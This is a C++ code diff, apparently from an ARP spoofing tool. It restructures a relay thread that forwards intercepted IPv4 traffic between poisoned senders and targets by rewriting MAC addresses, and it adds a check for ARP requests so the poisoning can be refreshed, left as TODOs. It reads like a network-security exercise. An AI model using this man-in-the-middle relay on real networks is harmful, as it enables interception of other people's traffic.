@@ -446,14 +446,6 @@ void tInfectAll(const char* deviceName_, Mac MyMac_,
 }
 
 
-
-void tCaptureAll(const char* deviceName_, Mac MyMac_,
- std::vector<Ip> SenderIpList_, std::vector<Mac> SenderMacList_,
- std::vector<Ip> TargetIpList_, std::vector<Mac> TargetMacList_){
-	return;
-}
-
-
 /**
  * @brief Thread function to relay given (maybe)infected senders and targets.
  * 
@@ -501,55 +493,75 @@ void tRelayAll(const char* deviceName_, Mac MyMac_,
 
 		// relay only Eth + Ipv4 packet.
 		eEthIpv4TcpPacket* pktHdr = (eEthIpv4TcpPacket*)rawRecv;
-		if (ntohs(pktHdr->eEthHdr_.TYPE) != EthHdr::Ip4){
-			// drop Ipv6, arp, etc.
-			// @Todo: capture [sender -> me] ARP request(unicast to me) packet and refresh using single ARP reply packet.
-			// @Todo: capture [sedner -> all] ARP request(broadcast=expired) packet and refresh using multiple ARP reply packets.
-			// @Todo: capture [target -> sender] ARP request(host scan) packet and refresh single ARP reply packet.
+		uint16_t ethType = ntohs(pktHdr->eEthHdr_.TYPE);
+		if (ethType == EthHdr::Arp){
+			// @Todo1: capture [sender -> me] ARP request(unicast to me) packet and refresh using single ARP reply packet.
+			// @Todo2: capture [sender -> all] ARP request(broadcast=expired) packet and refresh using lazy or multiple ARP reply packets.
+			EthArpPacket* pktEthArp = (EthArpPacket*)rawRecv;
+			for(int i = 0; i < listSize; i++){
+				if (pktEthArp->eth_.smac_ == SenderMacList_.at(i)
+				 && pktEthArp->arp_.op_ == ArpHdr::Request
+				 && pktEthArp->arp_.smac_ == SenderMacList_.at(i)
+				 && pktEthArp->arp_.sip_ == SenderIpList_.at(i)
+				 && pktEthArp->arp_.tmac_ == Mac().nullMac()
+				 && pktEthArp->arp_.tip_ == TargetIpList_.at(i)){
+					if ((pktEthArp->eth_.dmac_ == MyMac_)){
+						// @Todo1: send single ARP reply packet.
+					}
+					else if (pktEthArp->eth_.dmac_ == Mac().broadcastMac()){
+						// @Todo2: send multiple or lazy ARP reply packets.
+					}
+				}
+			}
 			continue;
 		}
- 
-		for(int i = 0; i < listSize; i++){
-			uint32_t pktSrcIp = ntohl(pktHdr->eIpv4Hdr_.SRC_IP_ADDR);
-			uint32_t pktDstIp = ntohl(pktHdr->eIpv4Hdr_.DST_IP_ADDR);
-			uint32_t senderIp = SenderIpList_.at(i);
-			uint32_t targetIp = TargetIpList_.at(i);
-	
-			// src ip가 sender이고, 내 ip로 보낸 패킷이 아니라면,
-			if (pktSrcIp == senderIp && pktDstIp != myIpAddr) {
-				// @Todo: pass jumbo frames.
-				uintptr_t originalSrcMacPtr = (uintptr_t)&(pktHdr->eEthHdr_.SRC_MAC_ADDR);
-				memcpy((void*)originalSrcMacPtr, myMacAddr, sizeof(uint8_t) * 6);
+		else if (ethType == EthHdr::Ip4){
+			for(int i = 0; i < listSize; i++){
+				uint32_t pktSrcIp = ntohl(pktHdr->eIpv4Hdr_.SRC_IP_ADDR);
+				uint32_t pktDstIp = ntohl(pktHdr->eIpv4Hdr_.DST_IP_ADDR);
+				uint32_t senderIp = SenderIpList_.at(i);
+				uint32_t targetIp = TargetIpList_.at(i);
+		
+				// src ip가 sender이고, 내 ip로 보낸 패킷이 아니라면,
+				if (pktSrcIp == senderIp && pktDstIp != myIpAddr) {
+					// @Todo: pass jumbo frames.
+					uintptr_t originalSrcMacPtr = (uintptr_t)&(pktHdr->eEthHdr_.SRC_MAC_ADDR);
+					memcpy((void*)originalSrcMacPtr, myMacAddr, sizeof(uint8_t) * 6);
 
-				uintptr_t originalDstMacPtr = (uintptr_t)&(pktHdr->eEthHdr_.DST_MAC_ADDR);
-				memcpy((void*)originalDstMacPtr, (uint8_t*)(TargetMacList_.at(i)), sizeof(uint8_t) * 6);
+					uintptr_t originalDstMacPtr = (uintptr_t)&(pktHdr->eEthHdr_.DST_MAC_ADDR);
+					memcpy((void*)originalDstMacPtr, (uint8_t*)(TargetMacList_.at(i)), sizeof(uint8_t) * 6);
 
-				int res = pcap_sendpacket(handle, reinterpret_cast<const u_char*>(pktHdr), header->caplen);
-				if (res != 0) {
-					fprintf(stderr, "pcap_sendpacket error=%s\n", pcap_geterr(handle));
-					pcap_close(handle);
-					return;
-				}				
-				break;
-			}
-	
-			// src mac이 target이고, sender ip에게 보낸 패킷이라면,
-			if (memcmp(pktHdr->eEthHdr_.SRC_MAC_ADDR, (uint8_t*)(TargetMacList_.at(i)), sizeof(uint8_t) * 6) == 0
-			 && pktDstIp == senderIp){
-				uintptr_t originalSrcMacPtr = (uintptr_t)&(pktHdr->eEthHdr_.SRC_MAC_ADDR);
-				memcpy((void*)originalSrcMacPtr, myMacAddr, sizeof(uint8_t) * 6);
-
-				uintptr_t originalDstMacPtr = (uintptr_t)&(pktHdr->eEthHdr_.DST_MAC_ADDR);
-				memcpy((void*)originalDstMacPtr, (uint8_t*)(SenderMacList_.at(i)), sizeof(uint8_t) * 6);
-
-				int res = pcap_sendpacket(handle, reinterpret_cast<const u_char*>(pktHdr), header->caplen);
-				if (res != 0) {
-					fprintf(stderr, "pcap_sendpacket error=%s\n", pcap_geterr(handle));
-					pcap_close(handle);
-					return;
+					int res = pcap_sendpacket(handle, reinterpret_cast<const u_char*>(pktHdr), header->caplen);
+					if (res != 0) {
+						fprintf(stderr, "pcap_sendpacket error=%s\n", pcap_geterr(handle));
+						pcap_close(handle);
+						return;
+					}				
+					break;
 				}
-				break;
+		
+				// src mac이 target이고, sender ip에게 보낸 패킷이라면,
+				if (memcmp(pktHdr->eEthHdr_.SRC_MAC_ADDR, (uint8_t*)(TargetMacList_.at(i)), sizeof(uint8_t) * 6) == 0
+				&& pktDstIp == senderIp){
+					uintptr_t originalSrcMacPtr = (uintptr_t)&(pktHdr->eEthHdr_.SRC_MAC_ADDR);
+					memcpy((void*)originalSrcMacPtr, myMacAddr, sizeof(uint8_t) * 6);
+
+					uintptr_t originalDstMacPtr = (uintptr_t)&(pktHdr->eEthHdr_.DST_MAC_ADDR);
+					memcpy((void*)originalDstMacPtr, (uint8_t*)(SenderMacList_.at(i)), sizeof(uint8_t) * 6);
+
+					int res = pcap_sendpacket(handle, reinterpret_cast<const u_char*>(pktHdr), header->caplen);
+					if (res != 0) {
+						fprintf(stderr, "pcap_sendpacket error=%s\n", pcap_geterr(handle));
+						pcap_close(handle);
+						return;
+					}
+					break;
+				}
 			}
+		}
+		else{
+			// drop Ipv6, etc.
+			continue;
 		}
 	}
 	pcap_close(handle);
